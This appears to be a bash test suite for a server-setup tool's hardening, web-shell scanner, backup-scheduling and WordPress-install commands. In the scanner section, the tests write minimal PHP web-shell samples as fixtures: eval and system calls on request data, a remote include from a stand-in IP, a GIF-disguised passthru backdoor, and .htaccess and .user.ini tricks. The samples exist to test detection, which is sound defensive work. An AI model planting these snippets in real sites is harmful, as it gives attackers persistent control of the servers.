_hd_site hd4.example.com php; eval '_sitefw_uid() { case "$1" in hd4_example_com) echo 2004 ;; *) echo 2001 ;; esac; }'
: >"$TMP/hd-fw-calls"; OPT_DRY_RUN=1; lib_sitefw_regen >/dev/null 2>&1; OPT_DRY_RUN=0
assert_lacks "a dry run writes no rule for a new site" "2004" "$(cat "$SITEFW_DIR/rules.v4")"
assert_eq    "and loads nothing" "" "$(cat "$TMP/hd-fw-calls")"
lib_sitefw_regen
assert_has  "a new site is in the rules once they are regenerated" "--uid-owner 2004 -j LOMP-SITES-LOCAL" "$(cat "$SITEFW_DIR/rules.v4")"
assert_has  "applying a vhost regenerates them" 'lib_sitefw_regen' "$(declare -f lib_domain_apply_config)"
assert_has  "and so does removing a site"       'lib_sitefw_regen' "$(declare -f lib_domain_remove_main)"

# ---- the command
: >"$TMP/hd-calls"
eval 'lib_require_tools() { :; }; lib_require_installed() { :; }; lib_system_profile() { :; }
      lib_ols_is_installed() { return 0; }
      lib_ols_change_begin() { OLS_PENDING_RELOAD=0; }
      lib_ols_change_commit() { printf "commit %s\n" "$*" >>"$TMP/hd-calls"; }
      lib_harden_php_restart() { printf "restart %s\n" "$1" >>"$TMP/hd-calls"; }
      lib_domain_registered() { [[ -s "$STATE_DIR/domains/$1/domain.json" ]]; }
      _harden_code() { cat "$TMP/hd-code" 2>/dev/null || printf 200; }'
_out="$(OPT_QUIET=0; lib_harden_main --all 2>&1; printf 'rc=%s' "$?")"
assert_has "harden --all exits 0" "rc=0" "$_out"
for _d in hd1 hd2 hd4; do
  assert_eq "${_d}: process execution blocked in its state" "blocked" "$(jq -r '.security.php_exec' "$STATE_DIR/domains/${_d}.example.com/domain.json")"
  assert_true "${_d}: its ini is in place" test -s "$HARDEN_PHP_INI_ROOT/${_d}.example.com/$HARDEN_PHP_INI_NAME"
  assert_has  "${_d}: its PHP is started again to read it" "restart ${_d}_example_com" "$(cat "$TMP/hd-calls")"
done
assert_has "the proxy site is told only the firewall applies" "hd3.example.com: no PHP runs here (proxy)" "$_out"
assert_eq  "and gets no decision" "null" "$(jq -c '.security' "$STATE_DIR/domains/hd3.example.com/domain.json")"
assert_eq  "one change set for all of them" 1 "$(grep -c '^commit site hardening' "$TMP/hd-calls")"
# one site that needs exec keeps it, and only it
: >"$TMP/hd-calls"
_out="$(OPT_QUIET=0; lib_harden_main hd4.example.com --allow-exec 2>&1)"
assert_eq    "--allow-exec is recorded" "allowed" "$(jq -r '.security.php_exec' "$STATE_DIR/domains/hd4.example.com/domain.json")"
assert_eq    "its upload directories stay closed" "blocked" "$(jq -r '.security.upload_php' "$STATE_DIR/domains/hd4.example.com/domain.json")"
assert_false "its ini directory goes" test -e "$HARDEN_PHP_INI_ROOT/hd4.example.com"
assert_true  "the others keep theirs" test -s "$HARDEN_PHP_INI_ROOT/hd1.example.com/$HARDEN_PHP_INI_NAME"
assert_lacks "and are not restarted" "restart hd1_example_com" "$(cat "$TMP/hd-calls")"
# a site that answered before and not after is named, and the command fails
printf '200' >"$TMP/hd-code"
eval 'lib_harden_php_restart() { printf 500 >"$TMP/hd-code"; }'
_out="$(OPT_QUIET=0; rc=0; lib_harden_main hd1.example.com >"$TMP/hd-out" 2>&1 || rc=$?; cat "$TMP/hd-out"; printf 'rc=%s' "$rc")"
assert_has "a site that stops answering is named" "hd1.example.com (HTTP 200 -> 500)" "$_out"
assert_has "with the way back" "lomp harden <domain> --allow-exec" "$_out"
assert_has "and a failing status" "rc=1" "$_out"
rm -f "$TMP/hd-code"
_out="$(OPT_QUIET=0; OPT_DRY_RUN=1; lib_harden_main hd4.example.com 2>&1)"
assert_eq  "a dry run changes no state" "allowed" "$(jq -r '.security.php_exec' "$STATE_DIR/domains/hd4.example.com/domain.json")"
assert_has "and says what it would do"  "hd4.example.com: process execution would be blocked" "$_out"
assert_false "a site that is not registered is refused" bash -c "$(declare -f lib_harden_main lib_require_tools lib_require_installed lib_domain_registered lib_die 2>/dev/null); STATE_DIR='$STATE_DIR'; lib_harden_main nosuch.example.com >/dev/null 2>&1"
_st="$(lib_harden_status)"
assert_has "status shows the firewall" "Site firewall: on" "$_st"
assert_has "and each site's decision"  "allowed" "$(grep '^hd4.example.com' <<<"$_st")"
assert_has "doctor names a site nobody decided about" 'site ${d}: hardening' "$(declare -f _doc_check_domains)"
assert_has "and a firewall that is off or not loaded" 'lib_sitefw_loaded' "$(declare -f _doc_check_sitefw)"
assert_has "setup.sh has the command" 'harden)         lib_harden_main' "$(cat "$ROOT/setup.sh")"
assert_has "status takes no lock"     'harden) case "${rest[0]:-help}" in status|help' "$(cat "$ROOT/setup.sh")"
assert_has "the menu offers it"       '23) _menu_harden' "$(cat "$ROOT/lib/menu.sh")"
assert_has "update keeps the firewall's loader current" 'lib_sitefw_enable ||' "$(declare -f lib_install_migrate)"
STATE_DIR="$_hd_state"; HARDEN_PHP_INI_ROOT="$_hd_ini"; SITEFW_DIR="$_hd_fw"; SITEFW_SCRIPT="$_hd_sc"; SITEFW_UNIT="$_hd_un"
# shellcheck disable=SC2086
unset -f $_hd_fns _hd_site _hd_m; eval "$_hd_saved"
lib_domain_state_reset

# =============================================================================
section "scan: what a web shell is made of, and not what an honest file has"
# The files below are what the command is for and what it must leave alone. Each check reads
# the records the awk program prints (P = a file, F = a finding in it), then the command's own
# output once.
_sc_saved="$(declare -f lib_domains_list)"
_sc_state="$STATE_DIR"; STATE_DIR="$TMP/sc-state"
eval "$(sed -n '/^lib_domains_list() {/,/^}/p' "$ROOT/lib/common.sh")"
for _d in sc1.example.com sc2.example.com; do
  mkdir -p "$STATE_DIR/domains/$_d" "$SITES_ROOT/$_d/public_html"; printf '{}\n' >"$STATE_DIR/domains/$_d/domain.json"
done
_sc="$SITES_ROOT/sc1.example.com"; _scp="$_sc/public_html"
mkdir -p "$_scp/wp-content/uploads/2026" "$_scp/lib"
_sc_b64="$(printf 'QUJD%.0s' $(seq 1 400))"   # 1600 characters of base64
# an honest file: the same functions, used the way applications use them
cat >"$_scp/lib/honest.php" <<EOF
<?php
// evaluate the form, then include the header: system requirements are checked in exec order
// \$_POST['name'] (string) is the visitor's name; class FilesManager stores what was sent
\$data = base64_decode(\$row['payload']);
\$pdo->exec("DELETE FROM log"); \$out = curl_exec(\$ch); Db::exec(\$sql); \$r = \$this->system(\$x);
\$s = preg_replace('/\s+/i', ' ', \$s); \$t = preg_replace('#<e>#', '', \$t);
require_once \$_SERVER['DOCUMENT_ROOT'] . '/config.php'; include 'header.php';
if (isset(\$_POST['name'])) { \$name = trim(\$_POST['name']); \$obj->save(\$_POST['name']); }
echo '<img src="data:image/png;base64,${_sc_b64}">';
echo "\xEF\xBB\xBF" . chr(13) . chr(10);
\$map = array("\x80" => "\xE2\x82\xAC", "\x81" => "\xEF\xBF\xBD", "\x82" => "\xE2\x80\x9A", "\x83" => "\xC6\x92", "\x84" => "\xE2\x80\x9E", "\x85" => "\xE2\x80\xA6", "\x09\x0A\x0B\x0C\x0D\x20\x2F\x3E");
EOF
printf '<?php eval(base64_decode("ZWNobyAxOw=="));\n' >"$_scp/a-decoded.php"
printf '<?php\n\n@eval ( $_POST["c"] );\n' >"$_scp/b-request.php"
printf '<?php echo "<pre>"; system($_GET["cmd"]); ?>\n' >"$_scp/c-command.php"
printf '<?php $_GET["f"]($_GET["a"]);\n' >"$_scp/d-named.php"
printf '<?php include($_REQUEST["p"]);\n' >"$_scp/e-include.php"
printf '<?php include "http://203.0.113.9/x.txt";\n' >"$_scp/f-remote.PHP"
printf '<?php /* WSO Shell */ $default_action = "FilesMan";\n' >"$_scp/g-known.phtml"
printf 'GIF89a<?php passthru($_COOKIE["x"]);\n' >"$_scp/favicon.ico"
printf '<?php $c = gzinflate(base64_decode($s)); $f($_POST["a"]);\n' >"$_scp/h-packed.php"
printf '<?php $p = "%s";\n' "$_sc_b64" >"$_scp/i-long.php"
printf '<?php $k = "%s";\n$j = "%s";\n' "$(printf '\\x6a%.0s' $(seq 1 25))" "$(printf '\\x6b%.0s' $(seq 1 30))" >"$_scp/j-hex.php"
printf '<?php $n = %s"";\n' "$(printf 'chr(1%.0s).' $(seq 1 9))" >"$_scp/k-chr.php"
printf '<?php // Silence is golden.\n' >"$_scp/wp-content/uploads/2026/index.php"
printf 'auto_prepend_file = /home/sc1.example.com/public_html/a-decoded.php\n' >"$_scp/.user.ini"
printf 'AddType application/x-httpd-php .jpg\n' >"$_scp/.htaccess"
printf '<?php file_put_contents("x.php", $_POST["body"]); preg_replace("/.*/e", $_x, "");\n' >"$_scp/l-write.php"
printf '<?php eval(base64_decode("x")); // \033[2J\033]0;owned\007 \302\233 31m\n' >"$_scp/m-escape.php"
: >"$_scp/empty.php"
_rec="$(_scan_run "$_sc" 0)"
_sc_file() { awk -F'\t' -v f="$1" '$1 == "P" { on = ($3 == f) } on' <<<"$_rec"; }   # the records of one file
assert_lacks "an honest file is not listed" "honest.php" "$_rec"
assert_lacks "nor an empty one" "empty.php" "$_rec"
for _c in "a-decoded.php|eval of decoded data" "b-request.php|eval of what the request sent" \
          "c-command.php|a command made of what the request sent" "d-named.php|a function named by the request" \
          "e-include.php|include of a file the request names" "f-remote.PHP|include from an address or a stream" \
          "g-known.phtml|the name of a known web shell" "favicon.ico|PHP code in a file that is not named as a script"; do
  _r="$(_sc_file "public_html/${_c%%|*}")"
  assert_has "strong: ${_c%%|*}" $'P\tH\tpublic_html/'"${_c%%|*}" "$_r"
  assert_has "  as ${_c##*|}" "${_c##*|}" "$_r"
done
assert_has "the line is named" $'F\tH\t3\teval of what the request sent\t@eval ( $_POST["c"] );' "$(_sc_file public_html/b-request.php)"
for _c in "h-packed.php|decoding inside decoding (packed code)" "h-packed.php|a function held in a variable, called with request data" \
          "i-long.php|a long encoded string (1600 characters)" "j-hex.php|text hidden as \\x escapes (25 letters on one line)" \
          "k-chr.php|text put together from chr() pieces" "wp-content/uploads/2026/index.php|a script in an upload directory" \
          ".user.ini|a file run before or after every script" ".htaccess|file types handed to PHP" \
          "l-write.php|what the request sent, written to a file" "l-write.php|preg_replace with the e modifier"; do
  _r="$(_sc_file "public_html/${_c%%|*}")"
  assert_has "worth a look: ${_c%%|*}" $'P\tL\tpublic_html/'"${_c%%|*}" "$_r"
  assert_has "  as ${_c##*|}" "${_c##*|}" "$_r"
done
assert_eq  "a second line of the same kind is not a second finding" 1 "$(_sc_file public_html/j-hex.php | grep -c 'text hidden as' || true)"
assert_has "every file read is counted, the empty one too" $'N\t19\t0' "$_rec"
assert_eq  "a finding is reported once per file" 1 "$(printf '<?php\neval(base64_decode("a"));\neval(base64_decode("b"));\n' >"$_scp/a-decoded.php"; _scan_run "$_sc" 0 | grep -c $'^F\tH\t[0-9]*\teval of decoded data\teval(base64_decode("[ab]' || true)"
# what the site's files say reaches a terminal as printable characters only
_r="$(_sc_file public_html/m-escape.php)"
assert_has   "text from a file is shown" 'eval(base64_decode("x")); // ?[2J?]0;owned? ?? 31m' "$_r"
assert_lacks "without its escape sequences" $'\033' "$_rec"
if printf '<?php eval($_POST[1]);\n' >"$_scp/n"$'\033[31m\n'".php" 2>/dev/null; then
  _rec="$(_scan_run "$_sc" 0)"
  assert_has   "a file name keeps to one line" $'P\tH\tpublic_html/n?[31m?.php' "$_rec"
  assert_lacks "and brings no escape sequence" $'\033' "$_rec"
  rm -f "$_scp/n"$'\033[31m\n'".php"
fi
# --wide lists every use, the honest ones too
_rec="$(_scan_run "$_sc" 1)"; _r="$(_sc_file public_html/lib/honest.php)"
assert_has   "--wide lists a file that only uses base64_decode" "uses base64_decode()" "$_r"
assert_lacks "a method called exec is not process execution" "starts a process" "$_r"
assert_lacks "nor is the word in a comment eval" "uses eval()" "$_r"
assert_has   "--wide names the call that starts a process" "starts a process" "$(_sc_file public_html/c-command.php)"
# a link is not followed: what it names is not this site's
if (( CAN_SYMLINK )); then
  printf '<?php eval($_POST[1]);\n' >"$TMP/sc-outside.php"
  ln -s "$TMP/sc-outside.php" "$_scp/linked.php"; mkdir -p "$TMP/sc-outdir"; cp "$TMP/sc-outside.php" "$TMP/sc-outdir/x.php"; ln -s "$TMP/sc-outdir" "$_scp/linkdir"
  _rec="$(_scan_run "$_sc" 0)"
  assert_lacks "a linked file is not read" "linked.php" "$_rec"
  assert_lacks "nor a linked directory entered" "linkdir" "$_rec"
fi
# the command: strong findings first, the counts, and nothing changed
_sc_sum() { find "$_sc" -type f -exec cksum {} + | sort; }
_before="$(_sc_sum)"
_out="$(OPT_QUIET=0; rc=0; lib_scan_main --all >"$TMP/sc-out" 2>&1 || rc=$?; cat "$TMP/sc-out"; printf 'rc=%s' "$rc")"
assert_eq  "scan changes no file" "$_before" "$(_sc_sum)"
assert_has "it exits 0, findings or not" "rc=0" "$_out"
assert_has "a strong finding is shown with its file" "  STRONG  public_html/b-request.php" "$_out"
assert_has "its line and what it is" "          line 3: eval of what the request sent" "$_out"
assert_has "and the text there" '            @eval ( $_POST["c"] );' "$_out"
assert_has "a finding that has no line is shown without one" "          a script in an upload directory" "$_out"
assert_has "the site's counts" "sc1.example.com: 9 file(s) with strong signs of a web shell, 8 more worth a look" "$_out"
assert_has "a clean site says so" "sc2.example.com: nothing found in 0 files" "$_out"
assert_has "what a match means is said once" "A match is a reason to open the file, not a verdict" "$_out"
_first_look="$(grep -n '  LOOK    ' "$TMP/sc-out" | head -1 | cut -d: -f1)"; _last_strong="$(grep -n '  STRONG  ' "$TMP/sc-out" | tail -1 | cut -d: -f1)"
assert_true "strong findings come before the rest" test "$_last_strong" -lt "$_first_look"
_out="$(OPT_QUIET=0; lib_scan_main sc2.example.com 2>&1)"
assert_lacks "a clean run has no advice to give" "A match is a reason" "$_out"
assert_false "a site that is not registered is refused" bash -c "$(declare -f lib_scan_main lib_scan_usage lib_domain_valid lib_domain_registered lib_domain_json lib_die 2>/dev/null); STATE_DIR='$STATE_DIR'; lib_scan_main nosuch.example.com >/dev/null 2>&1"
assert_false "--all and a domain together are refused" bash -c "$(declare -f lib_scan_main lib_scan_usage lib_die 2>/dev/null); lib_scan_main --all sc1.example.com >/dev/null 2>&1"
assert_has "setup.sh has the command" 'scan)           lib_scan_main' "$(cat "$ROOT/setup.sh")"
assert_has "it takes no lock: it only reads" 'list|status|doctor|credentials|logs|menu|scan) ;;' "$(cat "$ROOT/setup.sh")"
assert_has "the menu offers it"       '24) _menu_scan' "$(cat "$ROOT/lib/menu.sh")"
assert_has "and the command reference" 'scan <domain>|--all [--wide]' "$(lib_usage)"
STATE_DIR="$_sc_state"; unset -f _sc_file _sc_sum; eval "$_sc_saved"

section "backup --schedule: automatic backups after the installation"
lib_require_tools() { return 0; }; lib_require_installed() { return 0; }
lib_cron_remove backup
( lib_backup_main --schedule "daily 02:30" --keep 14 --no-mail ) >/dev/null 2>&1
assert_has "the cron entry, with the options given" "30 2 * * * root $BIN_LINK backup --all --yes --quiet --keep 14 --no-mail # server-setup:backup" "$(cat "$CRON_FILE")"
assert_eq  "the schedule is recorded"   "daily 02:30"         "$(lib_manifest_get '.backup.schedule')"
assert_eq  "and its options"            "--keep 14 --no-mail" "$(lib_manifest_get '.backup.schedule_flags')"
( lib_backup_main --schedule "weekly sat 04:05" ) >/dev/null 2>&1
assert_eq  "a new schedule replaces the old one" 1 "$(grep -c 'server-setup:backup$' "$CRON_FILE")"
assert_has "weekly"                     "5 4 * * 6 root $BIN_LINK backup --all --yes --quiet  # server-setup:backup" "$(cat "$CRON_FILE")"
assert_false "a schedule for one site is refused" bash -c "$(declare -f lib_backup_main lib_require_tools lib_require_installed lib_die 2>/dev/null); BACKUP_KEEP=7; lib_backup_main example.com --schedule hourly >/dev/null 2>&1"
assert_false "a tag is refused"         bash -c "$(declare -f lib_backup_main lib_require_tools lib_require_installed lib_die 2>/dev/null); BACKUP_KEEP=7; lib_backup_main --schedule hourly --tag x >/dev/null 2>&1"
assert_false "and --schedule with nothing after it" bash -c "$(declare -f lib_backup_main lib_require_tools lib_require_installed lib_die 2>/dev/null); BACKUP_KEEP=7; lib_backup_main --schedule >/dev/null 2>&1"
assert_true  "none of which touched the entry" lib_cron_has backup
( lib_backup_main --schedule off ) >/dev/null 2>&1
assert_false "off removes the entry"    lib_cron_has backup
assert_eq  "and the record of it"       "" "$(lib_manifest_get '.backup.schedule')$(lib_manifest_get '.backup.schedule_flags')"
assert_has "the menu offers it"         '3) Automatic backups' "$(declare -f _menu_backup)"
assert_has "and the command reference"  '--schedule "daily 03:00"' "$(lib_usage)"

# =============================================================================
section "wordpress: the files of the latest release, into a site that is there"
# Root downloads wordpress.org/latest.zip and checks it; the site's user unpacks it and copies
# it into the document root. Here curl is a function that hands out a small stand-in archive -
# built by hand, with modes no site should end up with - and its checksum. unzip, find and cp
# are the real ones, run through the suite's runuser.
_wp_saved="$(declare -p STATE_DIR DOM_FIX_OWNER_PATH DOM_HARDLINKS_SYSCTL DOM_MOUNTINFO OPT_YES)"
_wp_orig_ids="$(declare -f _domain_fix_owner_ids)"; _wp_orig_list="$(declare -f lib_domains_list)"
_wp_orig_apt="$(declare -f lib_apt_install)"
STATE_DIR="$TMP/wp-state"; mkdir -p "$STATE_DIR"
_wp_zip="$TMP/wp-fixture.zip"; _wp_out="$TMP/wp-out"; _wp_curl="$TMP/wp-curl.log"; _wp_chown="$TMP/wp-chown.log"
base64 -d >"$_wp_zip" <<'EOF'
UEsDBBQAAAAAAAAAIVwAAAAAAAAAAAAAAAAKAAAAd29yZHByZXNzL1BLAwQUAAAAAAAAACFc9fY8Dh4AAAAeAAAAEwAAAHdvcmRw
cmVzcy9pbmRleC5waHA8P3BocCAvLyB0aGUgZnJvbnQgY29udHJvbGxlcgpQSwMEFAAAAAAAAAAhXD94IvcEAAAABAAAABUAAAB3
b3JkcHJlc3MvbGljZW5zZS50eHRHUEwKUEsDBBQAAAAAAAAAIVwAAAAAAAAAAAAAAAATAAAAd29yZHByZXNzL3dwLWFkbWluL1BL
AwQUAAAAAAAAACFcH0JckQ8AAAAPAAAAIwAAAHdvcmRwcmVzcy93cC1hZG1pbi9zZXR1cC1jb25maWcucGhwPD9waHAgLy8gc2V0
dXAKUEsDBBQAAAAAAAAAIVwAAAAAAAAAAAAAAAAWAAAAd29yZHByZXNzL3dwLWluY2x1ZGVzL1BLAwQUAAAAAAAAACFcdwHOeh0A
AAAdAAAAIQAAAHdvcmRwcmVzcy93cC1pbmNsdWRlcy92ZXJzaW9uLnBocDw/cGhwCiR3cF92ZXJzaW9uID0gJzkuOC43JzsKUEsD
BBQAAAAAAAAAIVwDN2ZCCAAAAAgAAAAnAAAAd29yZHByZXNzL3dwLWNvbnRlbnQvdGhlbWVzL3Qvc3R5bGUuY3NzLyogdCAqLwpQ
SwECFAMUAAAAAAAAACFcAAAAAAAAAAAAAAAACgAAAAAAAAAAABAAwEEAAAAAd29yZHByZXNzL1BLAQIUAxQAAAAAAAAAIVz19jwO
HgAAAB4AAAATAAAAAAAAAAAAAACAgSgAAAB3b3JkcHJlc3MvaW5kZXgucGhwUEsBAhQDFAAAAAAAAAAhXD94IvcEAAAABAAAABUA
AAAAAAAAAAAAAP+BdwAAAHdvcmRwcmVzcy9saWNlbnNlLnR4dFBLAQIUAxQAAAAAAAAAIVwAAAAAAAAAAAAAAAATAAAAAAAAAAAA
EAD/Qa4AAAB3b3JkcHJlc3Mvd3AtYWRtaW4vUEsBAhQDFAAAAAAAAAAhXB9CXJEPAAAADwAAACMAAAAAAAAAAAAAAO2B3wAAAHdv
cmRwcmVzcy93cC1hZG1pbi9zZXR1cC1jb25maWcucGhwUEsBAhQDFAAAAAAAAAAhXAAAAAAAAAAAAAAAABYAAAAAAAAAAAAQAO1B
LwEAAHdvcmRwcmVzcy93cC1pbmNsdWRlcy9QSwECFAMUAAAAAAAAACFcdwHOeh0AAAAdAAAAIQAAAAAAAAAAAAAApIFjAQAAd29y
ZHByZXNzL3dwLWluY2x1ZGVzL3ZlcnNpb24ucGhwUEsBAhQDFAAAAAAAAAAhXAM3ZkIIAAAACAAAACcAAAAAAAAAAAAAAKCBvwEA
AHdvcmRwcmVzcy93cC1jb250ZW50L3RoZW1lcy90L3N0eWxlLmNzc1BLBQYAAAAACAAIADYCAAAMAgAAAAA=
EOF
_wp_sha="$(sha1sum "$_wp_zip" | cut -d' ' -f1)"
_wp_sha_served="$_wp_sha"; _wp_net_down=0
# curl the way the command calls it: "-o FILE" somewhere, the address last
eval 'lib_require_tools() { return 0; }
      lib_apt_install() { return 1; }
      _domain_fix_owner_ids() { printf "%s" "$_wp_ids"; }
      curl() {
        local out="" url="" a=""
        while (($# > 0)); do a="$1"; shift; if [[ "$a" == "-o" ]]; then out="$1"; shift; else url="$a"; fi; done
        printf "%s\n" "$url" >>"$_wp_curl"
        if (( _wp_net_down )); then return 6; fi
        case "$url" in
          https://wordpress.org/latest.zip)      cp "$_wp_zip" "$out" ;;
          https://wordpress.org/latest.zip.sha1) printf "%s" "$_wp_sha_served" >"$out" ;;
          *) return 22 ;;
        esac
      }'
eval "$(sed -n '/^lib_domains_list() {/,/^}/p' "$ROOT/lib/common.sh")"
# the command run the way setup.sh runs it (errexit armed); prints the exit status, and the
# output goes to $_wp_out
_wpf() {
  local rc=0 prev=""
  prev="$(trap -p ERR || true)"
  trap - ERR
  set +e
  ( set -Eeuo pipefail; shopt -s lastpipe; OPT_QUIET=0; lib_domain_wordpress_main "$@" ) >"$_wp_out" 2>&1
  rc=$?
  set -e
  [[ -z "$prev" ]] || eval "$prev"
  printf '%s' "$rc"
}
_wp_site() {   # domain mode
  lib_domain_state_reset
  D_DOMAIN="$1"; D_IDENT="$(lib_domain_ident "$1")"; D_USER="$D_IDENT"; D_GROUP="$D_IDENT"
  D_HOME="$SITES_ROOT/$1"; D_MODE="$2"; D_PHP="8.3"; D_STATUS="active"
  lib_domain_state_save
  mkdir -p "$D_HOME/public_html" "$D_HOME/private/tmp"
}
_wp_site wp1.example.com php
_wp_site wps.example.com static
_wp_h="$SITES_ROOT/wp1.example.com"; _wp_d="$_wp_h/public_html"
read -r _wp_u _wp_g < <(stat -c '%u %g' "$_wp_d")
_wp_ids="${_wp_u} ${_wp_g}"   # everything there is the site's own
# the page a new site starts with
assert_has "a new site's page carries the sentence the command knows it by" '${DOMAIN_PLACEHOLDER_MARK}' "$(declare -f lib_domain_dirs_create)"
printf '<body><p>This site was %s.</p></body>\n' "$DOMAIN_PLACEHOLDER_MARK" >"$_wp_d/index.html"
: >"$_wp_curl"

assert_eq  "no domain is an error"               1 "$(_wpf)"
assert_has "which says so"                       "Domain missing" "$(cat "$_wp_out")"
assert_eq  "an unknown option is refused"        1 "$(_wpf wp1.example.com --force)"
assert_eq  "and a second site"                   1 "$(_wpf wp1.example.com wps.example.com)"
assert_eq  "a name that is no domain too"        1 "$(_wpf ../etc)"
assert_eq  "a site that is not registered too"   1 "$(_wpf nosuch.example.com)"
assert_has "with the command that adds it"       "setup.sh add nosuch.example.com" "$(cat "$_wp_out")"
assert_eq  "a static site cannot run WordPress"  1 "$(_wpf wps.example.com)"
assert_has "and is told why"                     "it is a static site: no PHP runs there" "$(cat "$_wp_out")"
assert_eq  "help exits 0"                        0 "$(_wpf --help)"
OPT_DRY_RUN=1
assert_eq  "a dry run exits 0"                   0 "$(_wpf wp1.example.com)"
assert_has "and says what a real run would do"   "[dry-run] would download https://wordpress.org/latest.zip and unpack it into" "$(cat "$_wp_out")"
OPT_DRY_RUN=0
assert_eq  "none of this went to the network"    "" "$(cat "$_wp_curl")"
assert_eq  "or touched the site"                 "index.html" "$(ls -A "$_wp_d")"

if command -v unzip >/dev/null 2>&1; then
  _wp_sha_served="0000000000000000000000000000000000000000"
  assert_eq  "an archive that does not match its checksum is refused" 1 "$(_wpf wp1.example.com)"
  assert_has "by name"                             "WordPress checksum mismatch" "$(cat "$_wp_out")"
  _wp_sha_served="<html>not a checksum</html>"
  assert_eq  "so is one whose checksum is no checksum" 1 "$(_wpf wp1.example.com)"
  _wp_sha_served="$_wp_sha"; _wp_net_down=1
  assert_eq  "a download that fails is an error"   1 "$(_wpf wp1.example.com)"
  assert_has "and the end of the run"              "FAILED: WordPress download failed" "$(cat "$_wp_out")"
  _wp_net_down=0
  # checked, but not what wordpress.org publishes: it gets as far as the working directory
  printf 'this is not an archive\n' >"$TMP/wp-not-a-zip"
  _wp_good_zip="$_wp_zip"; _wp_zip="$TMP/wp-not-a-zip"; _wp_sha_served="$(sha1sum "$_wp_zip" | cut -d' ' -f1)"
  assert_eq  "an archive that cannot be unpacked is an error" 1 "$(_wpf wp1.example.com)"
  assert_has "named as such"                       "The WordPress archive could not be unpacked" "$(cat "$_wp_out")"
  # ... and a sound archive of something else
  base64 -d >"$TMP/wp-other.zip" <<'EOF'
UEsDBBQAAAAAAAAAIVxNHSRmDgAAAA4AAAAQAAAAb3RoZXIvcmVhZG1lLnR4dG5vdCBXb3JkUHJlc3MKUEsBAhQDFAAAAAAAAAAh
XE0dJGYOAAAADgAAABAAAAAAAAAAAAAAAKSBAAAAAG90aGVyL3JlYWRtZS50eHRQSwUGAAAAAAEAAQA+AAAAPAAAAAAA
EOF
  _wp_zip="$TMP/wp-other.zip"; _wp_sha_served="$(sha1sum "$_wp_zip" | cut -d' ' -f1)"
  assert_eq  "so is an archive that holds something else" 1 "$(_wpf wp1.example.com)"
  assert_has "said the same way"                   "The WordPress archive could not be unpacked" "$(cat "$_wp_out")"
  _wp_zip="$_wp_good_zip"; _wp_sha_served="$_wp_sha"
  assert_eq  "after all of which the site is as it was" "index.html" "$(ls -A "$_wp_d")"
  assert_eq  "and its private/tmp empty: the working directory is taken away again" "" "$(ls -A "$_wp_h/private/tmp")"

  printf 'DB_NAME=wp1_db\nDB_USER=wp1_user\nDB_PASS=Wp1DbPassw0rdForTheTest\n' >"$STATE_DIR/domains/wp1.example.com/db.info"
  mkdir -p "$_wp_h/private/tmp/.lomp-wordpress.abcdef"; printf 'x' >"$_wp_h/private/tmp/.lomp-wordpress.abcdef/left-behind"
  printf 'upload' >"$_wp_h/private/tmp/phpA1b2C3"
  lib_cron_remove htaccess
  : >"$RUNUSER_LOG"; : >"$_wp_curl"
  assert_eq  "a new site gets WordPress"           0 "$(_wpf wp1.example.com)"
  _wp_o="$(cat "$_wp_out")"; _wp_ru="$(cat "$RUNUSER_LOG")"
  assert_eq  "the archive is fetched, then its checksum" $'https://wordpress.org/latest.zip\nhttps://wordpress.org/latest.zip.sha1' "$(cat "$_wp_curl")"
  assert_true  "its front controller is in the document root itself" test -f "$_wp_d/index.php"
  assert_true  "with what lies deeper"             test -f "$_wp_d/wp-content/themes/t/style.css"
  assert_false "and not inside a wordpress/ there" test -e "$_wp_d/wordpress"
  assert_false "the page the site started with is gone" test -e "$_wp_d/index.html"
  assert_eq  "the working directory is gone, with the one an interrupted run left" "phpA1b2C3" "$(ls -A "$_wp_h/private/tmp")"
  if (( CAN_CHMOD )); then
    assert_eq "every directory is 0755, whatever the archive said" "" "$(find "$_wp_d" -type d ! -perm 0755)"
    assert_eq "and every file 0644"                "" "$(find "$_wp_d" -type f ! -perm 0644)"
  fi
  assert_has "it is unpacked as the site's user"   "-u wp1_example_com -- env -C / unzip -q -o " "$_wp_ru"
  assert_has "and copied as the site's user"       "-u wp1_example_com -- env -C / cp -a --remove-destination -- " "$_wp_ru"
  assert_lacks "lomp's own page is nothing to ask about" "already holds" "$_wp_o"
  assert_has "the version is named"                "WordPress 9.8.7 is in place" "$_wp_o"
  assert_has "and where to finish the installation" "http://wp1.example.com/" "$_wp_o"
  assert_has "with the database the installer asks for" "wp1_db" "$_wp_o"
  assert_has "its user"                            "wp1_user" "$_wp_o"
  assert_has "and the password"                    "Wp1DbPassw0rdForTheTest" "$_wp_o"
  assert_eq  "which stays out of the log"          0 "$(grep -c 'Wp1DbPassw0rdForTheTest' "$LOG_FILE" || true)"
  assert_has "and that its wp-config.php will be closed" "goes to 0640 by itself within a minute of the installation" "$_wp_o"
  assert_has "and the check that does it runs every minute" "* * * * * root $BIN_LINK htaccess-check --quiet # server-setup:htaccess" "$(cat "$CRON_FILE")"

  # a document root that holds something: asked about first, and only the same names replaced
  printf 'mine\n' >"$_wp_d/own.txt"; printf 'old\n' >"$_wp_d/index.php"; printf '<h1>my own page</h1>\n' >"$_wp_d/index.html"
  rm -f "$STATE_DIR/domains/wp1.example.com/db.info"
  lib_json_set "$(lib_domain_json wp1.example.com)" '.ssl.enabled = true | .www = true | .www_primary = true'
  OPT_YES=0; : >"$_wp_curl"
  assert_eq  "a document root that holds something is asked about, and no answer is a no" 1 "$(_wpf wp1.example.com)"
  assert_has "it says how much is there"           "already holds 7 files and directories" "$(cat "$_wp_out")"
  assert_has "and that it was not confirmed"       "not confirmed" "$(cat "$_wp_out")"
  assert_eq  "before anything is downloaded"       "" "$(cat "$_wp_curl")"
  assert_eq  "or replaced"                         "old" "$(cat "$_wp_d/index.php")"
  OPT_YES=1
  assert_eq  "with --yes it goes ahead"            0 "$(_wpf wp1.example.com)"
  _wp_o="$(cat "$_wp_out")"
  assert_eq  "a file of the same name is replaced" "<?php // the front controller" "$(cat "$_wp_d/index.php")"
  assert_eq  "one with another name stays"         "mine" "$(cat "$_wp_d/own.txt")"
  assert_eq  "an index.html of somebody's own too" "<h1>my own page</h1>" "$(cat "$_wp_d/index.html")"
  assert_has "https and www where the site answers there" "https://www.wp1.example.com/" "$_wp_o"
  assert_has "a site without a database is told how to get one" "setup.sh db wp1.example.com" "$_wp_o"

  # an installed WordPress is not this command's to touch
  printf '<?php // config\n' >"$_wp_d/wp-config.php"; : >"$_wp_curl"
  assert_eq  "a site that has a wp-config.php is left alone" 1 "$(_wpf wp1.example.com)"
  assert_has "and told why"                        "WordPress is already installed" "$(cat "$_wp_out")"
